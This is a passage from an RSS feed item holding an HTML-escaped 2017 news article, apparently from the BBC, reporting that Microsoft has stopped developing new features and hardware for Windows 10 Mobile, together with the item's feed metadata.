            &lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;Mr Belfiore began a series of tweets on Sunday by discussing the recent launch of a test version of Microsoft's Edge web browser for Android and iOS - the latest in a series of releases of its core software for rival mobile platforms.&lt;/p&gt;&lt;p&gt;He then went on to respond to questions about whether there was any point sticking with Windows 10 Mobile.&lt;/p&gt;&lt;p&gt;He said that while Microsoft would support the &quot;many companies&quot; that had adopted the platform, he had switched to Android for the diversity of its apps and hardware.&lt;/p&gt;&lt;p&gt;&quot;Of course we'll continue to support the platform... bug fixes, security updates, et cetera,&quot; he said.&lt;/p&gt;&lt;p&gt;&quot;But building new features or hardware is not the focus.&quot;&lt;/p&gt;&lt;p&gt;Mr Belfiore posted Microsoft had tried &quot;very hard&quot; to incentivise other companies to release universal apps - even writing their software for them in some cases - but the number of users had been too low for most to bother.&lt;/p&gt;&lt;p&gt;The announcement comes a week after HP had said it no longer planned to release further Windows 10 Mobile handsets, and a fortnight after Microsoft co-founder Bill Gates disclosed that he had &lt;a href=&quot;http://www.bbc.co.uk/news/technology-41399823&quot; class=&quot;story-body__link&quot;&gt;already made the switch to Android&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;However, some manufacturers - including the UK's Wileyfox and Germany's TrekStor - had unveiled new models powered by Windows 10 Mobile as recently as last month.&lt;/p&gt;&lt;p&gt;&quot;Most Microsoft applications are now available and supported on other mobile operating systems,&quot; said Mr Jeronimo.&lt;/p&gt;&lt;p&gt;&quot;After Satya Nadella took over [as chief executive], that clearly became the strategy - and after that happened what incentive was there to buy a Windows-powered phone?&quot;&lt;/p&gt;&lt;p&gt;However, Microsoft may not have given up on powering smartphones altogether.&lt;/p&gt;&lt;p&gt;Earlier this year, Windows Central reported the company was &lt;a href=&quot;https://www.windowscentral.com/microsofts-plan-windows-10-mobile-and-existing-phones&quot; class=&quot;story-body__link-external&quot;&gt;working on a new version of Windows 10&lt;/a&gt; - codenamed Andromeda - that would run on all types of computer and make it possible for third-party apps to adapt without having to code a special &quot;universal&quot; version. &lt;/p&gt;&lt;p&gt;It said the OS was due for release next year, but suggested the code would not be offered as an upgrade to existing Windows 10 Mobile devices.&lt;/p&gt;&lt;p&gt;A spokeswoman for Microsoft was unable to provide further comment.&lt;/p&gt;
    </description>
<pubDate>Mon, 09 Oct 2017 10:35:30 +0000</pubDate>
<dc:creator>nocoder</dc:creator>
<og:title>Microsoft gives up on Windows 10 Mobile</og:title>
<og:type>article</og:type>
<og:description>The technology company says it struggled to convince others to make mobile apps for the platform.</og:description>
<og:url>http://www.bbc.co.uk/news/technology-41551546</og:url>
<og:image>https://ichef-1.bbci.co.uk/news/1024/cpsprodpb/316D/production/_98235621_whatsubject.jpg</og:image>
<dc:language>en-GB</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.bbc.co.uk/news/technology-41551546</dc:identifier>
</item>
</channel>
</rss>